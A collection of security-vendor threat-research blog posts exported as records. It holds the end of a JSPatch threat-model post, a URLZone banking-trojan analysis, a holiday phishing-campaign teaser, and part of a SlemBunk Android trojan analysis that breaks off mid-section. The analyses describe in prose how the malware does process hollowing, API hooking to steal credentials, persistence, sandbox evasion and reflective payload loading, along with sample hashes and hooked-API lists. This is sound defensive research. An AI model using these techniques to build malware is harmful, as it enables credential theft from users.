 <p>○      Figure 19 demonstrates a scenario of this type of attack:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/HotPatch/Figure19.png"" />
  <span class=""type-XS"">Figure 19. Threat model for JSPatch used by a
    malicious app developer</span></p>
 <p>●      <b>Precondition</b>: 1) Third-party ad SDK embeds JSPatch
  platform; 2) Host app uses the ad SDK; 3) Ad SDK provider has
  malicious intention against the host app.</p>
 <p>○      <b>Consequences</b>: 1) Ad SDK can exfiltrate data from the
  app sandbox; 2) Ad SDK can change the behavior of the host app; 3) Ad
  SDK can perform actions on behalf of the host app against the OS.</p>
 <p>○      This attack scenario is shown in Figure 20:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/HotPatch/Figure20.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 20. Threat model for JSPatch used by a
    third-party library provider</span></p>
 <p>The FireEye discovery of iBackdoor in 2015 is an alarming example of
  displaced trust within the iOS development community, and serves as a
  sneak peek into this type of overlooked threat.</p>
 <p>●      <b>Precondition</b>: 1) App embeds <i>JSPatch</i> platform;
  2) App Developer is legitimate; 3) App does not protect the
  communication from the client to the server for JavaScript content; 4)
  A malicious actor performs a man-in-the-middle (MITM) attack that
  tampers with the JavaScript content.</p>
 <p>○      <b>Consequences</b>: MITM can exfiltrate app contents within
  the sandbox; MITM can perform actions through Private API by
  leveraging host app as a proxy.</p>
 <p>○      This attack scenario is shown in Figure 21:</p>
 <p>           <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/HotPatch/Figure21.png"" />
  <span class=""type-XS"">Figure 21. Threat model for JSPatch used by an
    app targeted by MITM</span></p>
 <h2>
  <span class=""type-L"">Field Survey</span></h2>
 <p>
  <i>JSPatch</i> originated from China. Since its release in 2015, it
  has garnered success within the Chinese region. According to JSPatch,
  many popular and high profile Chinese apps have adopted this
  technology. FireEye app scanning found a total <b>1,220</b> apps in
  the App Store that utilize JSPatch.</p>
 <p>We also found that developers outside of China have adopted this
  framework. On one hand, this indicates that JSPatch is a useful and
  desirable technology in the iOS development world. On the other hand,
  it signals that users are at greater risk of being attacked –
  particularly if precautions are not taken to ensure the security of
  all parties involved. Despite the risks posed by JSPatch, FireEye has
  not identified any of the aforementioned applications as being
  malicious.  </p>
 <h2>
  <span class=""type-L"">Food For Thought</span></h2>
 <p>Many applaud Apple’s App Store for helping to keep iOS malware at
  bay. While it is undeniably true that the App Store plays a critical
  role in winning this acclaim, it is at the cost of app developers’
  time and resources.</p>
 <p>One of the manifestations of such a cost is the app hot patching
  process, where a simple bug fix has to go through an app review
  process that subjects the developers to <a href=""http://appreviewtimes.com/"" target=""_blank"">an average waiting
    time of seven days</a><sup> </sup>before updated code is approved.
  Thus, it is not surprising to see developers seeking various solutions
  that attempt to bypass this wait period, but which lead to unintended
  security risks that may catch Apple off guard.</p>
 <p>JSPatch is one of several different offerings that provide a
  low-cost and streamlined patching process for iOS developers. All of
  these offerings expose a similar attack vector that allows patching
  scripts to alter the app behavior at runtime, without the constraints
  imposed by the App Store’s vetting process. Our demonstration of
  abusing JSPatch capabilities for malicious gain, as well as our
  presentation of different attack scenarios, highlights an urgent
  problem and an imperative need for a better solution – notably due to
  a growing number of app developers in China and beyond having adopted JSPatch.</p>
 <p>Many developers have doubts that the App Store would accept
  technologies leveraging scripts such as JavaScript. According to <a href=""https://developer.apple.com/app-store/review/guidelines/#functionality"" target=""_blank"">Apple’s App Store Review Guidelines,</a> apps that
  download code <b>in any way or form</b> will be rejected. However, t<a href=""http://albert43.net/2015/07/12/JSPatch总结/"" target=""_blank"">he
    JSPatch community argues</a> it is in compliance with <a href=""https://developer.apple.com/programs/ios/information/iOS_Program_Information_4_3_15.pdf"" target=""_blank"">Apple’s iOS Developer Program Information</a>, which
  makes an <b>exception</b> to scripts and code downloaded and run by
  Apple's built-in WebKit framework or JavascriptCore, provided that
  such scripts and code do not change the primary purpose of the
  application by providing features or functionality that are
  inconsistent with the intended and advertised purpose of the
  application as submitted to the App Store.</p>
 <p>The use of malicious JavaScript (which presumably changes the
  primary purpose of the application) is clearly prohibited by the App
  Store policy. JSPatch is walking a fine line, but it is not alone. In
  our coming reports, we intend to similarly examine more solutions in
  order to find a better solution that satisfies Apple and the developer
  community without jeopardizing the users security experience. Stay tuned!</p>
 <p> </p>
 <p>
  <a name=""_ftn4""></a><sup>
    <sup>[1]</sup></sup> We have contacted the app provider regarding
  the issue. In order to protect the app vendor and its users, we choose
  to not disclose the identity before they have this issue
  addressed.<br /> <a name=""_ftn5""></a><sup>
    <sup>[2]</sup></sup> The redacted part is the hardcoded decryption key.</p>
 <p> </p>",http://www.fireeye.com/blog/threat-research/2016/01/hot_or_not_the_bene.html
URLZone Zones in on Japan,"<p>Recently we’ve seen an interesting trend from several crimeware
  families that were mainly active in the European region, and have now
  expanded their activity to Japan. <a href=""https://securityintelligence.com/konnichiwa-rovnix-aggressive-malware-hits-japanese-banks/"" target=""_blank"">Rovnix is one such family, as recently reported</a>
  by IBM X-Force.</p>
 <p>At the same time, we’ve seen another spam campaign break out in
  Japan. The malware attempted to deliver another old banking trojan
  named URLZone (aka Shiotob/Bebloh), <a href=""https://www.virusbtn.com/virusbulletin/archive/2012/09/vb201209-URLZone"" target=""_blank"">which
    was initially discovered in 2009</a>. URLZone is known to be very
  active in the European region, especially Spain and Germany. Now we
  have noticed that the spam group is focusing on Japan.</p>
 <p>This blog describes a URLZone spam campaign targeting Japan in
  December 2015. We discuss its new persistence and evasion techniques,
  as well as its well-known password stealing method and command and
  control (CnC) communication.</p>
 <h2>
  <b>Spam Campaign</b></h2>
 <p>On Dec. 16, 2015, and Dec. 21, 2015, we saw an extensive amount of
  URLZone spam emails being delivered to Japanese email users. Figure 1
  represents the spikes of URLZone spam activity we detected during that time.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/URLzone/image001.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1. Timeline of URLZone activities</span></p>
 <p>URLZone spam campaigns usually take place by targeting a specific
  region. The spam emails are crafted with the target region’s language,
  and are often sent using email account domains belonging to the target
  region. This increases the chance of recipients opening the malicious
  attachment, especially in non-English speaking regions, as the
  recipients are more familiar in exchanging emails in their native language.</p>
 <p>The email subject and content were simple and generic. The subjects
  were written in English and Japanese with short Japanese sentences for
  the body, as shown in Figure 2.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/URLzone/figure_2_a.png"" /></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/URLzone/figure_2_b.png"" /></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/URLzone/figure_2_c.png"" />
  <span class=""type-XS"">Figure 2. URLZone spam email samples</span></p>
 <p>Most of the spam emails were sent from freely available web email
  accounts in Japan. The majority of the emails used the domains
  softbank.jp and yahoo.co.jp, which are the largest mobile carrier and
  web portal service in Japan respectively.</p>
 <p>An attached ZIP archive containing URLZone binaries was given two
  extension names in order to disguise it as a DOC or JPG file and trick
  recipients into opening the malicious attachment. For example
  “scan01_doc_2015~jpeg.zip” extracts “scan01_doc_2015~jpeg.jpeg.exe”.</p>
 <h2>
  <b>Malware Analysis</b></h2>
 <p>URLZone is a banking trojan. It downloads a configuration file that
  contains information on targeted financial institutions, and uses web
  injection techniques to steal a user’s banking credentials. While the
  basic characteristics of URLZone samples in the campaign in Japan
  remained <a href=""https://www.arbornetworks.com/blog/asert/an-update-on-the-urlzone-banker/"" target=""_blank"">the same as the previous analysis done</a> by Arbor
  Networks, several new features were added to the latest URLZone sample.</p>
 <h3>
  <b>Initial Infection Stage</b></h3>
 <p>The malware uses process hollowing (also known as process
  replacement) to mask its execution. The malware tries to hollow
  explorer.exe or iexplorer.exe with a <b>“_section” </b>as added
  command-line parameter to identify this process as spawned by the malware.</p>
 <p>The process it hollows is initially started as suspended. It then
  modifies or writes its malicious code to the entry point of the
  hollowed process. Once the necessary code is written, it will resume
  the suspended process, thus executing its malicious payload.</p>
 <p>Next, the malware does one of the following:</p>
 <p>1.     Continues to run the malicious routine in this hollowed
  process if the hollowed process is 64-bit or it has a window (this is
  for hollowed iexplore.exe).</p>
 <p>2.     Continues the malicious routine by injecting itself into the
  running explorer.exe on the system.</p>
 <h3>
  <b>Stolen Information</b></h3>
 <h4>System Survey</h4>
 <p>To identify the victim system, the malware acquires the following details:</p>
 <p>-        Computer name</p>
 <p>-        OS major/minor version, as well as install date</p>
 <p>-        Hollowed process name version and time stamp</p>
 <p>-        IP address</p>
 <p>-        Keyboard layout</p>
 <p>This is sent out in a beacon POST to the CnC server <a href=""https://www.arbornetworks.com/blog/asert/an-update-on-the-urlzone-banker/"" target=""_blank"">as described in Arbor’s report</a>.</p>
 <h4>Email Addresses</h4>
 <p>URLZone steals the email addresses stored in the Windows Address
  Book (WAB). It does so by querying both wab32.dll and WAB file name in
  the registry. It then uses this library to parse through the WAB file
  and save the information to a randomly generated value in a randomly
  generated key /SOFTWARE/&lt;random&gt;/&lt;random_value&gt;.</p>
 <h4>Web/FTP/Email Information and Credentials</h4>
 <p>The malware steals web and FTP information by injecting malicious
  code into commonly used programs for connectivity. It injects a
  specific malicious routine on each target program that hooks a certain
  library used to send or receive network traffic. A continuous thread
  is running that constantly checks for the presence of these
  applications, and concurrently injects a certain hooking function
  dependent of the process name. The <a href=""https://www.virusbtn.com/virusbulletin/archive/2012/09/vb201209-URLZone"" target=""_blank"">hooking process is described in depth here</a>.</p>
 <p>-        iexplore.exe – WinInet hooking</p>
 <p>-        explorer.exe – WinInet hooking</p>
 <p>-        myie.exe – WinInet hooking</p>
 <p>-        firefox.exe. – WinInet hooking</p>
 <p>-        ftpte.exe – WinSock hooking</p>
 <p>-        coreftp.exe - WinSock hooking</p>
 <p>-        filezilla.exe - WinSock hooking</p>
 <p>-        TOTALCMD.EXE - WinSock hooking</p>
 <p>-        cftp.exe - WinSock hooking</p>
 <p>-        FTPVoyager.exe - WinSock hooking</p>
 <p>-        SmartFTP.exe - WinSock hooking</p>
 <p>-        WinSCP.exe - WinSock hooking</p>
 <p>-        chrome.exe – WinInet hooking</p>
 <p>-        opera.exe – WinInet hooking</p>
 <p>For FTP/Email applications (that do WinSock hooking), it hooks 3
  APIs from ws2_32.dll:</p>
 <p>-        ws2_32_send</p>
 <p>-        ws2_32_connect</p>
 <p>-        ws2_32_close</p>
 <p>It monitors FTP/MAIL transactions through ws2_32_connect by checking
  for the string “FTP” and “MAIL” on the connect parameters. The
  FTP/MAIL server address and connection handle is stolen from this
  hook. The ws2_32_send hook captures the authentication request by
  checking the strings “USER” and “PASS” to steal the user’s credentials.</p>
 <p>For Web applications that use WinInet, it consists of API hooks used
  for monitoring HTTP/S sessions using the hooks shown in the appendix.</p>
 <p>These hooks look for strings as specified in the malware’s
  configuration file, and these strings target the data from financial
  institutions. If a match is found, the malware sends out the
  information to its CnC server.</p>
 <h3>
  <b>Command and Control</b></h3>
 <p>URLZone uses a Domain Generation Algorithm (DGA), <a href=""http://www.johannesbader.ch/2015/01/the-dga-of-shiotob/"" target=""_blank"">as stated in other reports</a>. The initial CnC URL
  starts of as a hard-coded encrypted string within the malware body. If
  the hard-coded URL doesn’t work, the <a href=""http://www.johannesbader.ch/2015/01/the-dga-of-shiotob/"" target=""_blank"">malware then uses DGA</a> to find the right one.</p>
 <p>The malware checks for Internet connectivity by first connecting to
  google.com. It then proceeds to check, through SSLv3 handshake,
  whether the generated URL responds to its certificate. It continuously
  does this until a valid URL is found.</p>
 <p>The DGA takes in the previous URL as a seed to generate other domains.</p>
 <h3>
  <b>Persistence Mechanism</b></h3>
 <p>Unlike many other banking trojans, URLZone uses a clever persistence
  mechanism and clears its registry configuration only upon logoff,
  reboot, and shutdown.</p>
 <p>It does this using a <a target=""_blank"">Window Procedure that
    monitors Window Messages</a> for WM_QUERYENDSESSION</p>
 <p>Figure 3 shows a subroutine of the Windows Procedure.</p>
 <p>The persistence mechanism and registry clearing is done using the
  following method:</p>
 <p>1.     Malware creates a copy of itself unto %ProgramFiles% for
  Windows XP and %AppData% for Windows Vista and up with a randomly
  generated filename from a given list of strings. We’ll call this %dropfilepath%.</p>
 <p>2.     It registers a Window Procedure to monitor the window messages.</p>
 <p>3.     The Window Procedure checks the Windows Messages coming in
  the system and waits for a Window Message WM_QUERYENDSESSION to
  execute its routine, as describe below in Figure 3.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/URLzone/figure_3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3. Monitoring system shutdowns</span></p>
 <p>If the Window Procedure catches a WM_QUERYENDSESSION Window message
  it performs the following actions:</p>
 <p>a.    Delete the random registry key HKLM/SOFTWARE/&lt;random&gt;,
  which contains the stolen email addresses and interprocess
  configuration of injected routines.</p>
 <p>b.    Create Startup registry on
  Software\Microsoft\Windows\CurrentVersion\Run and write its
  corresponding registry value in either one of these methods:</p>
 <p>                        i.     Generate shortcut file (LNK file)
  pointing to %dropfilepath% and append “<b>-autorun</b>” to generated
  lnk file.<br />                         ii.     If %dropfilepath%
  doesn’t exist, continue to write a registry value with a
  <b>–autorun</b> parameter.</p>
 <p>·       Generate a random 20 character string with file extension
  .txt, and concatenate it with the folder of %dropfilepath% and name
  this as %txtfilepath%. Write a copy of the malware binary to
  %txtfilepath%, which is found on the running malware’s process heap or
  memory. Call MoveFileExA with the DELAY_UNTIL_REBOOT flag to copy the
  contents from %txtfilepath% to %dropfilepath%.  Specifying the
  DELAY_UNTIL_REBOOT flag, the binary delays this file’s move operation
  until the system reboots. This is likely done to prevent security
  software from being suspicious. Figure 4 shows the corresponding
  MoveFileExA API call.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/URLzone/figure_4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4. Delayed MoveFileExA API call to
    prevent antivirus detection</span></p>
 <h3>
  <b>Random Filename Generation</b></h3>
 <p>URLZone uses an interesting algorithm to generate random filenames.
  Unlike most banking trojans, which generate random looking strings for
  dropped filenames, URLZone uses an array of strings to generate the
  filename of the dropped file. To add entropy to the random string
  generation algorithm, it uses a subroutine that creates a random byte
  using the RDTSC instruction combined with other arithmetic operations.</p>
 <p>The array of strings used to generate the filename is as follows:</p>
 <p>char *filenames[] = [&quot;win&quot;, &quot;video&quot;,
  &quot;def&quot;, &quot;mem&quot;, &quot;dns&quot;,  &quot;user&quot;,
  &quot;logon&quot;, &quot;hlp&quot;, &quot;mixer&quot;,
  &quot;pack&quot;, &quot;mon&quot;, &quot;srv&quot;, &quot;exec&quot;, &quot;play&quot;]</p>
 <p>The random string generation algorithm can be invoked in two ways:</p>
 <p>1.     rand(len_min, len_max, upper_offset_limit) -&gt; to construct
  a random string from a given string.<br /> 2.    
  rand(upper_offset_limit) -&gt; to get a random string from a given array.</p>
 <p>len_min and len_max are the minimum and maximum lengths of the
  string to be returned. The upper_offset_limit is the upper limit of
  the offset, which is generated randomly.</p>
 <p>The above algorithms are used to generate the filename as follows:</p>
 <p>1.     Get a string randomly from the above array.<br /> 2.    
  Construct a random string of length between 1 and 2 from the string:
  &quot;qwertyuiopasdfghjklzxcvbnm123945678&quot;<br /> 3.     Calculate
  a flag randomly and check its value. If the value of the flag is 0,
  then it proceeds to concatenate the strings generated in step 1 and 2.
  If the value of flag is 1, then it gets one more string randomly from
  the array similar to step 1.</p>
 <p>By putting all this together, we have the following two ways
  filenames can be generated based on the value of the random flag:</p>
 <p>1.     If flag is 0, then concatenate strings in steps 1 and
  2.<br /> 2.     If flag is 1, then concatenate strings in steps 1, 2,
  and 3.</p>
 <p>The reason for generating the filenames this way may be to evade
  heuristics of security products, which alert on dropped executable
  files with randomly generated names. The filename generated using the
  above algorithm looks human readable and less suspicious.</p>
 <h3>
  <b>Evasion Technique</b></h3>
 <p>URLZone attempts to detect the use of VMware using the following method:</p>
 <p>1.     Resolve SetupDi APIs by pre-calculated string hash from
  setupapi.dll<br /> 2.     Retrieve the device information using those
  APIs<br /> 3.     Check if the device names acquired contain the
  string “vm”</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/URLzone/figure_5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5. VMware sandbox detection</span></p>
 <p>As shown in Figure 5, the malware partially collects two characters
  from “Software\Microsoft\Windows\CurrentVersion\Run” string to build
  up “vm” for comparison. SetupDi API enumerates all the names of the
  devices installed in the system, such as “vmware”, “svga ii”.</p>
 <p>As soon as one of the device names starts with the string “vm” it
  will jump to a hooking function and soon terminates the thread, thus
  not allowing the malware to continue further with is routine and CnC callback.</p>
 <h2>
  <b>An Ongoing Campaign</b></h2>
 <p>On Jan. 19, 2016, and Jan. 20, 2016, we observed another round of
  URLZone spam targeting Japan. The basic TTPs are unchanged, but the
  scale is larger than the spam campaign we observed in December 2015.</p>
 <h2>
  <b>Conclusion</b></h2>
 <p>Although URLZone has been around for a while and primarily targets
  countries in Europe, we still see it active and now shifting to Japan.
  It is likely that URLZone will further expand its activity in Japan
  with improved localization and techniques. Email users should be
  cautious about viewing emails coming from unknown senders.</p>
 <h2>
  <b>Appendix</b></h2>
 <p>URLZone sample hashes</p>
 <p>·      
  15896a44319d18f8486561b078146c30a0ce1cd7e6038f6d614324a39dfc6c28<br />
  ·       884fccbbfa5a5b96d2e308856b996ee20d9656d04505fb3cdf926270f5d11c28</p>
 <p>Hooked APIs</p>
 <p>·       WinInet.HttpEndRequestA<br /> ·      
  WinInet.HttpEndRequestW<br /> ·       WinInet.HttpOpenRequestA<br />
  ·       WinInet.HttpOpenRequestW<br /> ·      
  WinInet.HttpQueryInfoA<br /> ·       WinInet.HttpQueryInfoW<br />
  ·       WinInet.HttpSendRequestA<br /> ·      
  WinInet.HttpSendRequestExW<br /> ·      
  WinInet.HttpSendRequestW<br /> ·      
  WinInet.InternetCloseHandle<br /> ·      
  WinInet.InternetQueryDataAvailable<br /> ·      
  WinInet.InternetReadFile<br /> ·      
  WinInet.InternetReadFileExA<br /> ·      
  WinInet.InternetReadFileExW<br /> ·      
  WinInet.InternetWriteFile<br /> ·       nspr.PR_Read<br /> ·      
  nspr.PR_Write<br /> ·       nspr.PR_Close<br /> ·      
  ws2_32.send<br /> ·       ws2_32.connect<br /> ·       ws2_32.closesocket</p>
 <p> </p>",http://www.fireeye.com/blog/threat-research/2016/01/urlzone_zones_inon.html
Holiday Season 2015 Email Campaign,"<p>The holiday season is a time when many people go on vacation or at
  least get much-needed downtime from work, but that is not always the
  case with attackers. To better understand the threats we face during
  “the most wonderful time of the year,” FireEye Labs has been
  collecting data on the most prominent malware families delivered via
  email campaigns throughout the 2015 holiday season.</p>
 <p>Email phishing remains one of the primary infection vectors used by
  threat actors to deliver malware. Detecting these email campaigns
  continues to be challenging, as delivery methods and the form of the
  malware downloaders continue to evolve.</p>
 <hr />
  <div class=""c00 c00v0"">
  <div class=""button section"" style=""float: right;"">
    <a class=""btn btn-secondary"" href=""https://engage.vevent.com/index.jsp?eid=4929&amp;seid=911&amp;code=blog"" target=""_blank"">Register Now</a></div>
    <h3>Join us for a free webinar!</h3> <p>FireEye malware researchers
    Mary Grace Timcang and Robert Venal share key insights on email
    attack campaigns from various threat groups over the 2015 holiday
    season.<br /> Tues., Feb. 16 (11 a.m. ET/8 a.m. PT)<br /> </p> </div>
 <hr />
  <p>In this report you will learn about how Dridex conducted a
  large-scale attack using new delivery methods in a suspected attempt
  to obtain new victims following an October takedown, how FareIt
  continues to be creative in its social engineering techniques to
  entice targets, and how TeslaCrypt is using scripts that could easily
  be modified, which makes each sample highly dynamic in its content and
  techniques. We also detail campaigns involving Nivdort, Nymaim, and UrSnif.</p>
 <p>We expect these threats will persist and continue to adapt through
  new social engineering techniques, delivery methods, and the
  complexity of attacks.   </p>
 <p>As such, it is important for organizations to remain vigilant with
  user education, proactive detection technologies and security policies.</p>
 <p>
  <a href=""https://www2.fireeye.com/holiday-email-campaigns-fireeyelabs.html"" target=""_blank"">You can read the report here</a> and learn more
  about email campaigns that occurred during the 2015 holiday season.</p>
 <p>For more information on these threats, we will have a live webinar
  with FireEye’s Mary Grace Timcang and Robert Vernal. <a href=""https://engage.vevent.com/index.jsp?eid=4929&amp;seid=911&amp;code=blog"" target=""_blank"">Register
    here and join us on Tuesday, Feb. 16</a>, at 11 a.m. ET/8 a.m. PT.</p>",http://www.fireeye.com/blog/threat-research/2016/01/holiday_season_2015.html
SlemBunk Part II: Prolonged Attack Chain and Better-Organized Campaign,"<h5>Introduction<br /> </h5>
 <p>Our follow-up investigation of a nasty Android banking malware we
  identified at the tail end of last year has not only revealed that the
  trojan is more persistent than we initially realized – thus making for
  a much more dangerous threat – but that it is also being used as part
  of an ongoing and evolving campaign.</p>
 <p>On Wednesday, Dec. 17,<sup> </sup>2015, FireEye published <a href=""https://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2015/12/slembunk_an_evolvin.html"" target=""_blank"">SlemBunk: An Evolving Android Trojan Family
    Targeting Users of Worldwide Banking Apps</a>. The blog exposed
  SlemBunk – a family of Android trojan apps that attempt to steal the
  login credentials of mobile banking users. Those trojan apps
  masquerade as common, popular applications and stay incognito after
  running for the first time. They have the ability to phish for and
  harvest authentication credentials when specified banking apps are
  launched. In our initial investigation, we identified more than 170
  SlemBunk samples that targeted users of 33 mobile banking apps, whose
  service regions cover three major continents: North America, Europe,
  and Asia Pacific.</p>
 <p>The previous article described the technical details of SlemBunk,
  covering how it is composed, how it steals user credentials, and how
  it communicates with the command and control (CnC) server to conduct a
  variety of supporting functions. We also noted that drive-by downloads
  from porn sites were one distribution mechanism for the SlemBunk payload.</p>
 <p>After releasing those findings, we continued to monitor the
  development of SlemBunk and conducted a more in-depth study. Our
  investigation identified a much longer attack chain (as depicted in
  Figure 1) than we reported in the previous article. Before the
  invocation of the actual SlemBunk payload, up to three apps have to
  land on the device in order to fire the last deadly shot. This makes
  it much harder for analysts to trace the observed attacks back to
  their actual origin, and thus the malware can have a more persistent
  existence on the victim’s device.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/slembunkpt2/Figure1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1. Prolonged attack chain of latest
    SlemBunk development</span></p>
 <p>In this follow-up post, we present the technical details of this
  prolonged attack chain:</p>
 <ul> <li>A drive-by download starts the prolonged attack chain and puts
    the first app onto the victim’s device. We call this app the
      <b>SlemBunk dropper</b>.</li> <li>The dropper optionally uses a
    packer to hide its own payload, and thus runtime unpacking is needed
    to recover the second app: the <b>SlemBunk downloader</b>, which
    conducts in-app downloading to grab the actual malicious
  payload.</li> <li>The downloader app queries a customized CnC server
    for the <b>SlemBunk payload</b>, the final app in the attack chain,
    and this app fires the last shot. The details of how the SlemBunk
    payload works is described in our previous blog.</li> </ul>
 <p>Our additional research also identified the URLs of a few CnC
  servers for this campaign. We looked into the communication protocol
  between the SlemBunk apps and the CnC server by studying relevant code
  and monitoring the exchanged messages. It reveals that SlemBunk is
  developing into a more organized campaign with highly customized CnC
  servers, including the use of what appears to be an administration
  panel to manage the campaigns. The registration records of the
  relevant domains suggest that this campaign activity is very recent,
  still ongoing, and possibly evolving into different forms. In this
  follow-up article, we present our analysis into this data as well.</p>
 <h5>Drive-by Download: to Fetch SlemBunk Dropper</h5>
 <p>Early SlemBunk samples mainly distributed themselves by imitating
  popular apps, such as porn apps or essential tools. Drive-by
  downloads, however, can make it easier to reach more victims. The
  dropper app is the first app that lands on the victim’s device and the
  dropper app starts the prolonged attack chain that we will present in
  this article.</p>
 <p>Figure 2 shows an example website that provides porn content, as
  seen from the content hosted on the webpage. However, the website also
  serves additional hidden content. When a user accesses the website, a
  script embedded in the page first detects the device type that is
  accessing the site. If it is an Android device, and the version of
  Android is greater than 2 and less than 6.4 (as seen in the JavaScript
  code inside the lower box), the <i>apkDownload</i> function will be
  called. After the app is downloaded, the website also prompts its
  users to “Please Update Flash on Your Device” (as seen in pop-up
  window and also the JavaScript code in the upper box). Unwary users,
  who are more eager to see the video than to consider what this app is
  really about, would readily accept what the website is saying, and
  happily install the app that claims to be a Flash update. However,
  malware lands on the victim’s device instead.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/slembunkpt2/Figure2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2. Porn site supports drive-by download
    of SlemBunk dropper</span></p>
 <p>Usually, the app landing on the victim’s device is only a dropper
  for the actual malicious SlemBunk payload. By itself, the dropper
  can’t do much to compromise the user. To fire the last deadly shot, it
  has to go through a few other steps to achieve its surreptitious
  purpose. The next sections detail how the malicious payload finally
  lands on the victim’s device and enables theft of their banking credentials.</p>
 <h5>SlemBunk Dropper: to Unpack the SlemBunk Downloader</h5>
 <p>The downloader is the second app in the attack chain. Its main goal
  is to download the actual SlemBunk payload, which will be used to
  steal banking credentials from victims. However, the downloading logic
  is not very easy to identify. When looking into the dropper app
  downloaded from the above porn site, we found that there is only one
  class, named “<i>Application,</i>” inside the app’s code. The app is
  intentionally obfuscated because there are only a few Android API
  calls identified, most of which are Android’s reflection API calls
  used for dynamically loaded code. Figure 3 shows a snippet of the code
  to be invoked when the dropper is started.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/slembunkpt2/Figure3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3. Code to recover the in-app downloading logic</span></p>
 <p>Line 3 shows that the only class in the dropper app extends an
  Android framework class named <span class=""code"">&quot;android[.]app[.]Application&quot;</span>. The
  reason for this extension is so that any classes extending this
  Android API will be started before any other components of this app.
  Also, the overwritten method <span class=""code"">attachBaseContext</span> will be executed when an
  application is newly created. The SlemBunk dropper uses this trick to
  recover the in-app downloading logic.</p>
 <p>The original in-app downloading logic is encoded into a 9-kilobyte
  Unicode string (in line 13). The code from lines 14 to 41 will decode
  this Unicode string, and write this code into a new app file, whose
  path is <span class=""code"">&quot;/data/data/app_name/dex/new[.]apk</span>&quot;.
  Runtime instrumentation shows that the content of variable <span class=""code"">v3</span> after the <span class=""code"">while</span> loop
  (lines 19 to 26) will be the content of this apk file. The reflective
    <span class=""code"">write</span> call will write the content of <span class=""code"">v3</span> into the particular path at line 42. The
  reflective method calls (from lines 29 to 39) are all file-relevant
  operations used to prepare for the writing operation at line 42. Table
  1 shows the strings as encoded in the original code and as recovered
  at runtime.</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0"" width=""468""> <tbody>
    <tr>
      <td valign=""top"" width=""62""><p>Position</p> </td> <td valign=""top"" width=""241""><p>Original string
        (classes/methods/parameters)</p> </td> <td valign=""top"" width=""165""><p>Actual string for reflective classes, methods
          &amp; parameters</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""62""><p>Line 29</p> </td> <td valign=""top"" width=""241""><p>Class: ⴌ?질ꅁ<b>ऎ</b>㑝戡뿫唙<b>༮</b>ቄᥣ豰芒머ㆳ</p>
      </td> <td valign=""top"" width=""165""><p>java.lang.String</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""62""><p>Line 30</p> </td> <td valign=""top"" width=""241""><p>Class: ⴌ?질ꅁ<b>ऎ</b>㑘戯뾫唸<b>ཀྵ</b>ቻᥲ</p> </td>
        <td valign=""top"" width=""165""><p>java.io.File</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""62""><p>Lines 32-34</p> </td> <td valign=""top"" width=""241""><p>Class:ⴇ<b>័</b>짚ꅒॏ㑘戤뾫唝?ቹᥣ豧芕먢ㇺ䗩䶠楅됳꺿쥐<b>ൣ</b></p>
          <p>Method: ⴁ<b>៛</b>짊ꅤ<b>ॉ</b>㑃</p> <p>Parameter:
        ⴂ<b>៛</b>짆</p> </td> <td valign=""top"" width=""165""><p>android.content.Context</p> <p> </p>
        <p>getDir</p> <p> </p> <p>dex</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""62""><p>Line 36</p> </td> <td valign=""top"" width=""241""><p>Parameter: ⴈ<b>៛</b>짉ꄎ<b>ु</b>㑁戫</p> </td> <td valign=""top"" width=""165""><p>new.apk</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""62""><p>Line 38</p> </td> <td valign=""top"" width=""241""><p>Class:ⴌ?질ꅁ<b>ऎ</b>㑘戯뾫唸<b>ཀྵ</b>ቻᥲ豍芎먢ㆤ䗟?楸됳꺨쥍?ጢ</p>
      </td> <td valign=""top"" width=""165""><p>java.io.FileOutputStream</p>
      </td> </tr>
    <tr>
      <td valign=""top"" width=""62""><p>Line 41</p> </td> <td valign=""top"" width=""241""><p>Method: ⴑ<b>៌</b>짗ꅔ<b>ॅ</b></p> </td> <td valign=""top"" width=""165""><p>write</p> </td> </tr></tbody></table>
 <p>Table 1. Reflective method calls to decrypt the in-app downloading logic</p>
 <p>After replacing the actual readable strings into these reflective
  calls, it is easy to see that the logic here is to write the content
  of <span class=""code"">v3</span> (the decoded in-app downloading logic)
  into the file, whose path is &quot;<span class=""code"">/data/data/app_name/dex/new[.]apk&quot;</span>.</p>
 <p>In the same way, we decrypted the logic of the code shown in Figure
  4, which finishes the task of the SlemBunk dropper. This part of the
  code uses the <span class=""code"">loadDex</span> method of class <span class=""code"">&quot;dalvik[.]system[.]DexFile</span>&quot; to
  dynamically load the newly generated app, delete it from storage, and
  then call into its entry point.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/slembunkpt2/Figure4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4. Dropper code snippet to load the
    downloader and transfer control</span></p>
 <p>At this point, the packer has recovered the in-app downloading logic
  and called into its entry point. The next section will present our
  analysis of how the in-app downloading works.</p>
 <h5>
